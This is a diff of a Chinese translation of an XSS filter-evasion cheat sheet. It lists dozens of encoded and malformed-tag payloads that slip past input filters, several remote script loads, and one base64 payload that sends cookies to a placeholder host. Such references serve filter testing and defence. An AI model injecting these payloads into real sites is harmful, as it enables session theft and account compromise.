@@ -1,9 +1,87 @@
+### 2.1. 无过滤的基本 XSS 测试
+
+这是一个常规的 XSS 注入代码，虽然通常它会被防御，但是建议首先去测试一下。（引号在任何现代浏览器中都不需要，所以这里省略了它）：
+
+```html
+<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>
+```
+
+### 2.2. XSS 定位器(Polygot)
+
+如下是一个
+
+### 2.3. 使用 JavaScript 命令实现的图片 XSS
+
+图片注入使用 JavaScript 命令实现（IE7.0 不支持在图片上下文中使用 JavaScript 命令， 但是可以在其他上下文触发。下面的例子展示了一种其他标签依旧通用的原理）：
+
+```html
+<IMG SRC="javascript:alert('XSS');" />
+```
+
+### 2.4. 无分号无引号
+
+```html
+<IMG SRC=javascript:alert('XSS')>
+```
+
+### 2.5. 不区分大小写的 XSS 攻击向量
+
+```html
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+```
+
+### 2.6. HTML 实体
+
+必须有分号才可生效
+
+```html
+<IMG SRC="javascript:alert(&quot;XSS&quot;)" />
+```
+
+### 2.7. 重音符混淆
+
+如果你的 JavaScript 代码中需要同时使用单引号和双引号，那么可以使用重音符（`）来包含 JavaScript 代码。这通常会有很大帮助，因为大部分跨站脚本过滤器都没有过滤这个字符：
+
+```html
+<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
+```
+
+### 2.8. 畸形的 A 标签
+
+跳过 HREF 标签找到 XSS 的重点，由 David Cross 提交~已在 Chrome 上验证
+
+```html
+<a onmouseover="alert(document.cookie)">xxs link</a>
+```
+
+此外 Chrome 经常帮你补全缺失的引号，如果在这方面遇到问题就直接省略引号，Chrome 会帮你补全在 URL 或脚本中缺少的引号。
+
+```html
+<a onmouseover="alert(document.cookie)">xxs link</a>
+```
+
+### 2.9. 畸形的 IMG 标签
+
+最初由 Begeek 发现（短小精湛适用于所有浏览器），这个 XSS 攻击向量使用了不严格的渲染引擎，在 IMG 标签内创建被引号括起来的攻击向量。我猜测这种解析原来是为了兼容不规范的编码。这会让它更加难以正确的解析 HTML 标签：
+
+```html
+<IMG """><script>alert("XSS")</script>">
+```
+
+### 2.10. fromCharCode 函数
+
+如果不允许任何形式的引号，你可以通过执行 JavaScript 里的 fromCharCode 函数来创建任何你需要的 XSS 攻击向量：
+
+```html
+<IMG SRC="javascript:alert(String.fromCharCode(88,83,83))" />
+```
+
 ### 2.11. 使用默认 SRC 属性绕过 SRC 域名过滤器（有效）
 
 这种方法可以绕过大多数 SRC 域名过滤器。将 JavaScript 代码插入事件方法同样适用于注入使用 elements 的任何 HTML 标签，例如 Form, Iframe, Input, Embed 等等。它同样允许将事件替换为任何标签中可用的事件类型，例如 onblur, onclick。下面会给出许多不同的可注入事件列表。由 David Cross 提交，Abdullah Hussam(@Abdulahhusam)编辑。
 
 ```html
-<img src="#" onmouseover="alert('xxs')" />
+<IMG SRC="#" onmouseover="alert('xxs')" />
 ```
 
 ### 2.12. 使用默认为空的 SRC 属性（无效）
@@ -14,22 +92,22 @@
 
 ### 2.13. 不使用 SRC 属性
 
-通过 css 设置 img 大小达到可 mouseover 的情况，方有效。
+通过 css 设置 IMG 大小达到可 mouseover 的情况，方有效。
 
 ```html
-<img onmouseover="alert('xxs')" />
+<IMG onmouseover="alert('xxs')" />
 ```
 
 ### 2.14. 通过 error 事件触发 alert（有效）
 
 ```html
-    <IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
+<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></IMG>
 ```
 
 ### 2.15. 使用 IMG 标签中 onerror 属性并对 alert 进行编码（有效）
 
 ```html
-<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
+<IMG SRC=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
 ```
 
 ### 2.16. 十进制 HTML 字符实体编码
@@ -37,8 +115,8 @@
 所有在 IMG 标签里直接使用`javascript:`形式的 XSS 示例无法在 Firefox 或 Netscape 8.1 以上浏览器（使用 Gecko 渲染引擎）运行。
 
 ```html
-<img
-  src="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;"
+<IMG
+  SRC="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;"
   &#39;&#88;&#83;&#83;&#39;&#41;
 />
 ```
@@ -46,8 +124,8 @@
 ### 2.17. 不带分号的十进制 HTML 字符实体编码
 
 ```html
-<img
-  src="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&"
+<IMG
+  SRC="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&"
   #0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041
 />
 ```
@@ -55,28 +133,112 @@
 ### 2.18. 不带分号的十六进制 HTML 字符实体编码
 
 ```html
-<img
-  src="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29"
+<IMG
+  SRC="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29"
 />
 ```
 
 ### 2.19. 内嵌 TAB
 
 ```html
-<img src="jav	ascript:alert('XSS');" />
+<IMG SRC="jav	ascript:alert('XSS');" />
 ```
 
-### 2.20. 内嵌编码后 TAB
+### 2.20. 内嵌编码后的TAB分隔XSS代码
 
 ```html
-<img src="jav&#x09;ascript:alert('XSS');" />
+<IMG SRC="jav&#x09;ascript:alert('XSS');" />
+```
+
+### 2.21. 内嵌换行分隔XSS代码
+
+一些网站声称 09 到 13（十进制）的 HTML 实体字符都可以实现这种攻击，这是不正确的。只有 09（TAB），10（换行）和 13（回车）有效。查看 ASCII 字符表获取更多细节。下面几个 XSS 示例介绍了这些向量。
+
+```html
+<IMG SRC="jav&#x0A;ascript:alert('XSS');">
+```
+
+### 2.22. 内嵌回车分隔XSS代码
+
+（注意：上面我使用了比实际需要更长的字符串是因为 0 可以忽略。经常可以遇到过滤器解码十六进制和十进制编码时认为只有 2 到 3 字符。实际规则是 1 至 7 位字符）
+
+```html
+<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+```
+
+### 2.23. 使用空字符分隔JavaScript指令
+
+空字符同样可以作为 XSS 攻击向量，但和上面有所区别，你需要使用一些例如 Burp 工具 或在 URL 字符串里使用%00，亦或你想使用 VIM 编写自己的注入工具（^V^@会生成空 字符），还可以通过程序生成它到一个文本文件。老版本的 Opera 浏览器（例如 Windows 版的 7.11）还会受另一个字符 173（软连字符）的影响。但是空字符%00 更加有用并且能帮助绕过真实世界里的过滤器，例如这个例子里的变形：
+
+```html
+perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
+```
+
+### 2.24. 利用IMG标签中JavaScript代码前的空格以及元字符
+
+如果过滤器不计算"javascript:"前的空格，这是正确的，因为它们不会被解析，但这点非常有用。因为这会造成错误的假设，就是引号和"javascript:"字样间不能有任何字符。实际情况是你可以插入任何十进制的 1 至 32 号字符：
+
+```html
+<IMG SRC=" &#14;  javascript:alert('XSS');">
+```
+
+### 2.25. 利用非字母非数字的字符
+
+FireFox 的 HTML 解析器认为 HTML 关键词后不能有非字母非数字字符，并且认为这是一个空白或在 HTML 标签后的无效符号。但问题是有的 XSS 过滤器认为它们要查找的标记会被空白字符分隔。例如"<SCRIPT\s" != "<SCRIPT/XSS\s":
+
+```html
+<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>
+```
+
+基于上面的原理，可以使用模糊测试进行扩展。Gecko 渲染引擎允许任何字符包括字母， 数字或特殊字符（例如引号，尖括号等）存在于事件名称和等号之间，这会使得更加容易绕过跨站脚本过滤。注意这同样适用于下面看到的重音符:
+
+```html
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+```
+
+Yair Amit 让我注意到了 IE 和 Gecko 渲染引擎有一点不同行为，在于是否在 HTML 标签和参数之间允许一个不含空格的斜杠。如果系统不允许空格的时候，这会非常有用。
+
+```html
+<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>
+```
+
+### 2.26. 额外的尖括号
+
+由 Franz Sedlmaier 提交，这个 XSS 攻击向量可以绕过某些检测引擎，比如先查找第一个匹配的尖括号，然后比较里面的标签内容，而不是使用更有效的算法，例如 Boyer-Moore 算法就是查找整个字符串中的尖括号和相应标签（当然是通过模糊匹配）。双斜杠注释了额外的尖括号来防止出现 JavaScript 错误：
+
+```html
+<<SCRIPT>alert("XSS");//<</SCRIPT>
+```
+
+### 2.27. 未闭合的script标签
+
+在 Firefox 和 Netscape 8.1 的 Gecko 渲染引擎下你不是必须构造类似“></SCRIPT>” 的跨站脚本攻击向量。Firefox 假定闭合 HTML 标签是安全的并且会为你添加闭合标记。多么体贴！不像不影响 Firefox 的下一个问题，这不需要在后面有额外的 HTML 标签。如果需要可以添加引号，但通常是没有必要的，需要注意的是，我并不知道这样注入后 HTML 会什么样子结束:
+
+```html
+<SCRIPT SRC=http://xss.rocks/xss.js?< B >
+```
+
+### 2.28. script标签中的协议解析
+
+这个特定的变体是由 Łukasz Pilorz 提交的，并且基于 Ozh 提供的协议解析绕过。这个跨站脚本示例在 IE 和 Netscape 的 IE 渲染模式下有效，如果添加了</SCRIPT>标记在 Opera 中也可以。这在输入空间有限的情况下是非常有用的，你所使用的域名越短越好。".j"是可 用的，在 SCRIPT 标签中不需要考虑编码类型因为浏览器会自动识别。
+
+```html
+<SCRIPT SRC=//xss.rocks/.j>
+```
+
+### 2.29. 只含左尖括号的HTML/JavaScript XSS向量
+
+IE 渲染引擎不像 Firefox，不会向页面中添加额外数据。但它允许在 IMG 标签中直接使用 javascript。这对构造攻击向量是很有用的，因为不需要闭合尖括号。这使得有任何 HTML 标签都可以进行跨站脚本攻击向量注入。甚至可以不使用">"闭合标签。注意：这会让 HTML 页面变得混乱，具体程度取决于下面的 HTML 标签。这可以绕过以下 NIDS 正则: /((\%3 D)|(=))[^\n]*((\%3C)|<)[^\n]+((\%3E)|>)/因为不需要">"闭合。另外在实际对抗 XSS 过滤器的时候，使用一个半开放的<IFRAME 标签替代<IMG 标签也是非常有效的。
+
+```html
+<IMG SRC="javascript:alert('XSS')"
 ```
 
 ### 2-30 双尖括号<（chrome 即可测试）
 
 在正常标签后面使用一个左尖括号< 代替 右尖括号>，就可以用远程脚本攻击正常页面，比如直接用远程攻击脚本内容代替正常页面上的表单，从而直接获取用户提交的信息。没有左尖括号时，在 Firefox 中生效，而在 Netscape 中无效。
 
-`<iframe src=http://xss.rocks/scriptlet.html <`
+`<iframe SRC=http://xss.rocks/scriptlet.html <`
 
 ### 2-31 javascript 双重转义
 
@@ -366,17 +528,17 @@ Rnaske 进行了一个快速的 XSS 模糊测试来发现 IE 和安全模式下�
 注：源文章内容出现为 httx 的字符，测试改为 http
 
 这在 IE 中测试通过，但还得视情况而定。
-它是为了绕过那些允许`<SCRIPT>`但是不允许`<SCRIPT SRC...`形式的正则过滤，即`/<script[^>]+src/i`：
+它是为了绕过那些允许`<SCRIPT>`但是不允许`<SCRIPT SRC...`形式的正则过滤，即`/<script[^>]+SRC/i`：
 
 (有效)
 
 ```html
-<script a=">" src="httx://xss.rocks/xss.js"></script>
+<script a=">" SRC="httx://xss.rocks/xss.js"></script>
 ```
 
 ---
 
-这是为了绕过那些允许 `<SCRIPT>` 但是不允许 `<SCRIPT SRC...` 形式的正则过滤，即`/<script((\s+\w+(\s*=\s*(?:"(.)*?"|'(.)*?'|[^'">\s]+))?)+\s*|\s*)src/i`（这很重要，因为在实际环境中出现过这种正则过滤）
+这是为了绕过那些允许 `<SCRIPT>` 但是不允许 `<SCRIPT SRC...` 形式的正则过滤，即`/<script((\s+\w+(\s*=\s*(?:"(.)*?"|'(.)*?'|[^'">\s]+))?)+\s*|\s*)SRC/i`（这很重要，因为在实际环境中出现过这种正则过滤）
 (无效)
 
 ```html
@@ -385,7 +547,7 @@ Rnaske 进行了一个快速的 XSS 模糊测试来发现 IE 和安全模式下�
 
 ---
 
-另一个绕过此正则过滤`/<script((\s+\w+(\s*=\s*(?:"(.)*?"|'(.)*?'|[^'">\s]+))?)+\s*|\s*) src/i`的 XSS：
+另一个绕过此正则过滤`/<script((\s+\w+(\s*=\s*(?:"(.)*?"|'(.)*?'|[^'">\s]+))?)+\s*|\s*) SRC/i`的 XSS：
 (有效)
 
 ```html
@@ -403,7 +565,7 @@ Rnaske 进行了一个快速的 XSS 模糊测试来发现 IE 和安全模式下�
 
 ---
 
-最后一个绕过此正则过滤`/<script((\s+\w+(\s*=\s*(?:"(.)*?"|'(.)*?'|[^'">\s]+))?)+\s*|\ s*)src/i`的 XSS，使用了重音符（在 Firefox 下无效）：
+最后一个绕过此正则过滤`/<script((\s+\w+(\s*=\s*(?:"(.)*?"|'(.)*?'|[^'">\s]+))?)+\s*|\ s*)SRC/i`的 XSS，使用了重音符（在 Firefox 下无效）：
 (无效)
 
 ```html
@@ -418,7 +580,7 @@ Rnaske 进行了一个快速的 XSS 模糊测试来发现 IE 和安全模式下�
 (有效)
 
 ```html
-<script a=">'>" src="httx://xss.rocks/xss.js"></script>
+<script a=">'>" SRC="httx://xss.rocks/xss.js"></script>
 ```
 
 ---
@@ -475,7 +637,7 @@ Rnaske 进行了一个快速的 XSS 模糊测试来发现 IE 和安全模式下�
 #### 2.82.6. Base64 编码(无效)
 
 ```html
-<img
+<IMG
   onload="eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))"
 />
 ```
@@ -703,7 +865,7 @@ Firefox 使用 Google 的"feeling lucky"功能根据用户输入的任何关键�
 <iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
 <form><a href="javascript:\u0061lert(1)">X
 </script><img/*%00/src="worksinchrome&colon;prompt(1)"/%00*/onerror='eval(src)'>
-<style>//*{x:expression(alert(/xss/))}//<style></style>
+<style>//*{x:expression(alert(/xss/))}//<style></style> 
 On Mouse Over​
 <img src="/" =_=" title="onerror='prompt(1)'">
 <a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe
@@ -711,6 +873,7 @@ On Mouse Over​
 <form><button formaction=javascript&colon;alert(1)>CLICKME
 <input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
 <iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
+<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT> 
 ```
 
 #### 3.1 Alert 混淆以绕过过滤器
